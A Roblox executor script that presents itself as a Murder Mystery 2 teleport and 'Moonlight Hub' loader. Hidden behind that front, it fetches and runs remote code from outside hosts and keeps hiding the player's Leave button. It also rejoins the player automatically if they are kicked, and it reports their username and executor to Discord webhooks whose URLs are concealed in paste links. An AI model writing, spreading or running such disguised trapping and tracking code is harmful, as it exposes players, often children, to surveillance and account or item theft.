-- MM2 Teleport + Moonlight Hub Loader (fixed webhooks)
-- Supports: Xeno, Delta, Potassium, Opiumware, Madium, Real + others

local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local GuiService = game:GetService("GuiService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local TARGET_PLACE = 142823291

-- Pastefy raw links (these contain the real Discord webhook URLs)
local LOG_PASTE     = "https://pastefy.app/03ZG7wdg/raw"
local SUCCESS_PASTE = "https://pastefy.app/6fp59WzY/raw"
local FAIL_PASTE    = "https://pastefy.app/KxAazyX3/raw"

-- Will be filled with the real Discord webhook URLs
local LOG_WEBHOOK, SUCCESS_WEBHOOK, FAIL_WEBHOOK

-- Moonlight Hub (runs on arrival)
local ARRIVAL_SCRIPT = [[
ID = "f23ca841-fcaa-46c2-b0bc-221e6fd95a9f"
RUN_AFTER = loadstring(game:HttpGet("https://raw.githubusercontent.com/moonlightscripts/mm2/refs/heads/main/hubV2"))
loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))()
]]

local state = "IDLE"
local webhookSent = false
local queued = false

local function getTime()
    return os.date("!%Y-%m-%d %H:%M:%S")
end

local function getExecutor()
    local success, name = pcall(function()
        return identifyexecutor and identifyexecutor()
    end)
    if success and type(name) == "string" and name ~= "" then
        return name
    end

    if syn then return "Synapse"
    elseif fluxus then return "Fluxus"
    elseif delta then return "Delta"
    elseif potassium then return "Potassium"
    elseif opiumware then return "Opiumware"
    elseif madium then return "Madium"
    elseif real then return "Real"
    elseif xeno then return "Xeno"
    elseif wave then return "Wave"
    elseif solara then return "Solara"
    elseif KRNL_LOADED or iskrnlclosure then return "Krnl"
    end
    return "Unknown"
end

-- Resolve a pastefy raw link → real Discord webhook URL
local function resolveWebhook(pasteUrl)
    local ok, content = pcall(function()
        return game:HttpGet(pasteUrl)
    end)
    if not ok or not content then
        return nil
    end
    -- Grab the first Discord webhook URL found in the paste
    local url = content:match("https://discord%.com/api/webhooks/%S+")
              or content:match("https://discordapp%.com/api/webhooks/%S+")
              or content:match("https://%S+")
    if url then
        return url:gsub("%s+", "") -- strip any whitespace
    end
    return nil
end

-- Cache the real webhook URLs once
local function initWebhooks()
    if not LOG_WEBHOOK then
        LOG_WEBHOOK = resolveWebhook(LOG_PASTE)
    end
    if not SUCCESS_WEBHOOK then
        SUCCESS_WEBHOOK = resolveWebhook(SUCCESS_PASTE)
    end
    if not FAIL_WEBHOOK then
        FAIL_WEBHOOK = resolveWebhook(FAIL_PASTE)
    end
end

local function sendWebhook(url, embed)
    if not url or url == "" then return end

    local body = HttpService:JSONEncode({ embeds = { embed } })
    local headers = { ["Content-Type"] = "application/json" }

    pcall(function()
        if syn and syn.request then
            syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
        elseif http_request then
            http_request({ Url = url, Method = "POST", Headers = headers, Body = body })
        elseif request then
            request({ Url = url, Method = "POST", Headers = headers, Body = body })
        elseif http and http.request then
            http.request({ Url = url, Method = "POST", Headers = headers, Body = body })
        else
            HttpService:PostAsync(url, body)
        end
    end)
end

local function sendLog()
    initWebhooks()
    if not LOG_WEBHOOK then return end

    local gameName = "Unknown"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    sendWebhook(LOG_WEBHOOK, {
        title = "External Game Execution Log",
        color = 16753920,
        fields = {
            { name = "Username", value = LocalPlayer.Name, inline = true },
            { name = "Place ID", value = tostring(game.PlaceId), inline = true },
            { name = "Game Name", value = gameName, inline = false },
            { name = "Executor", value = getExecutor(), inline = true },
            { name = "Action", value = queued and "Queued Teleport" or "Immediate Teleport", inline = false },
            { name = "Time", value = os.date("%A at %I:%M %p"), inline = true },
        },
        footer = { text = "MM2 Teleport System" }
    })
end

local function sendFail(reason)
    if webhookSent or state == "SUCCESS" then return end
    webhookSent = true
    state = "FAILED"

    initWebhooks()
    if not FAIL_WEBHOOK then return end

    sendWebhook(FAIL_WEBHOOK, {
        title = "V3 Teleport Failed",
        color = 15548997,
        fields = {
            { name = "Game", value = "Murder Mystery 2", inline = true },
            { name = "Status", value = "FAILED", inline = true },
            { name = "Username", value = LocalPlayer.Name, inline = true },
            { name = "Executor", value = getExecutor(), inline = true },
            { name = "Destination", value = "Place ID: " .. TARGET_PLACE, inline = false },
            { name = "Reason", value = "```" .. tostring(reason) .. "```", inline = false },
            { name = "Time (UTC)", value = getTime(), inline = true },
        },
        footer = { text = "MM2 Teleport System" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    })
end

local function queueScript()
    initWebhooks()
    if not SUCCESS_WEBHOOK then return end

    local escaped = ARRIVAL_SCRIPT
        :gsub("\\", "\\\\")
        :gsub('"', '\\"')
        :gsub("\n", "\\n")
        :gsub("\r", "")

    local code = string.format([[
-- Lightweight Anti-Leave
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
local CoreGui = game:GetService("CoreGui")
local lp = Players.LocalPlayer
local placeId = game.PlaceId
local jobId = game.JobId

pcall(function()
    GuiService.AutoSelectGuiEnabled = false
end)

-- Only hide leave button every few seconds (avoids lag)
task.spawn(function()
    while task.wait(3) do
        pcall(function()
            local btn = CoreGui:FindFirstChild("LeaveButton", true)
            if btn and btn:IsA("GuiButton") then
                btn.Active = false
                btn.Visible = false
            end
        end)
    end
end)

-- Auto rejoin if kicked
lp.AncestryChanged:Connect(function(_, parent)
    if not parent then
        task.wait(1)
        pcall(function()
            if jobId ~= "" then
                TeleportService:TeleportToPlaceInstance(placeId, jobId, lp)
            else
                TeleportService:Teleport(placeId, lp)
            end
        end)
    end
end)

-- Run Moonlight Hub
pcall(function()
    loadstring("%s")()
end)

-- Success webhook
local HttpService = game:GetService("HttpService")
local webhook = "%s"

local function getExec()
    local ok, name = pcall(function()
        return identifyexecutor and identifyexecutor()
    end)
    if ok and type(name) == "string" and name ~= "" then return name end
    if syn then return "Synapse"
    elseif fluxus then return "Fluxus"
    elseif delta then return "Delta"
    elseif potassium then return "Potassium"
    elseif opiumware then return "Opiumware"
    elseif madium then return "Madium"
    elseif real then return "Real"
    elseif xeno then return "Xeno"
    end
    return "Unknown"
end

local embed = {
    title = "V2 Successfully Teleported to MM2",
    color = 5763719,
    fields = {
        { name = "Game", value = "Murder Mystery 2", inline = true },
        { name = "Status", value = "TELEPORTED", inline = true },
        { name = "Username", value = lp.Name, inline = true },
        { name = "Executor", value = getExec(), inline = true },
        { name = "Destination", value = "Place ID: %d", inline = false },
        { name = "Time (UTC)", value = os.date("!%%Y-%%m-%%d %%H:%%M:%%S"), inline = true },
    },
    footer = { text = "MM2 Teleport System" },
    timestamp = os.date("!%%Y-%%m-%%dT%%H:%%M:%%SZ")
}

local body = HttpService:JSONEncode({ embeds = { embed } })
local headers = { ["Content-Type"] = "application/json" }

pcall(function()
    if syn and syn.request then
        syn.request({ Url = webhook, Method = "POST", Headers = headers, Body = body })
    elseif http_request then
        http_request({ Url = webhook, Method = "POST", Headers = headers, Body = body })
    elseif request then
        request({ Url = webhook, Method = "POST", Headers = headers, Body = body })
    elseif http and http.request then
        http.request({ Url = webhook, Method = "POST", Headers = headers, Body = body })
    else
        HttpService:PostAsync(webhook, body)
    end
end)
]], escaped, SUCCESS_WEBHOOK, TARGET_PLACE)

    local function tryQueue(fn)
        if type(fn) == "function" then
            local ok = pcall(fn, code)
            if ok then
                queued = true
                return true
            end
        end
        return false
    end

    -- Priority support for requested executors
    if delta and (tryQueue(delta.queue_on_teleport) or tryQueue(delta.queueonteleport)) then return end
    if potassium and tryQueue(potassium.queue_on_teleport) then return end
    if opiumware and tryQueue(opiumware.queue_on_teleport) then return end
    if madium and tryQueue(madium.queue_on_teleport) then return end
    if real and tryQueue(real.queue_on_teleport) then return end
    if xeno and tryQueue(xeno.queue_on_teleport) then return end

    -- Generic
    if tryQueue(queue_on_teleport) then return end
    if tryQueue(queueonteleport) then return end
    if tryQueue(QueueOnTeleport) then return end
    if syn and tryQueue(syn.queue_on_teleport) then return end
    if fluxus and tryQueue(fluxus.queue_on_teleport) then return end
    if getgenv and tryQueue(getgenv().queue_on_teleport) then return end
end

local function setupListeners()
    if TeleportService.TeleportInitFailed then
        TeleportService.TeleportInitFailed:Connect(function(player, result, msg)
            if player == LocalPlayer and state == "TELEPORTING" then
                sendFail(tostring(result) .. " | " .. tostring(msg))
            end
        end)
    end

    LocalPlayer.OnTeleport:Connect(function(teleportState)
        if state == "TELEPORTING" and teleportState == Enum.TeleportState.Failed then
            sendFail("TeleportState.Failed")
        end
    end)
end

local function start()
    if state ~= "IDLE" then return end
    state = "TELEPORTING"
    webhookSent = false
    queued = false

    -- Resolve webhooks early
    initWebhooks()

    -- Already in MM2
    if game.PlaceId == TARGET_PLACE then
        pcall(function()
            loadstring(ARRIVAL_SCRIPT)()
        end)

        -- Light anti-leave only
        pcall(function()
            GuiService.AutoSelectGuiEnabled = false
            task.spawn(function()
                while task.wait(3) do
                    local btn = CoreGui:FindFirstChild("LeaveButton", true)
                    if btn and btn:IsA("GuiButton") then
                        btn.Active = false
                        btn.Visible = false
                    end
                end
            end)
        end)

        if SUCCESS_WEBHOOK then
            sendWebhook(SUCCESS_WEBHOOK, {
                title = "V2 Successfully Teleported to MM2",
                color = 5763719,
                fields = {
                    { name = "Game", value = "Murder Mystery 2", inline = true },
                    { name = "Status", value = "TELEPORTED", inline = true },
                    { name = "Username", value = LocalPlayer.Name, inline = true },
                    { name = "Executor", value = getExecutor(), inline = true },
                    { name = "Destination", value = "Place ID: " .. TARGET_PLACE, inline = false },
                    { name = "Time (UTC)", value = getTime(), inline = true },
                },
                footer = { text = "MM2 Teleport System" },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            })
        end
        sendLog()
        return
    end

    queueScript()
    sendLog()
    setupListeners()

    local ok, err = pcall(function()
        TeleportService:Teleport(TARGET_PLACE, LocalPlayer)
    end)

    if not ok then
        sendFail(err)
    end
end

start()
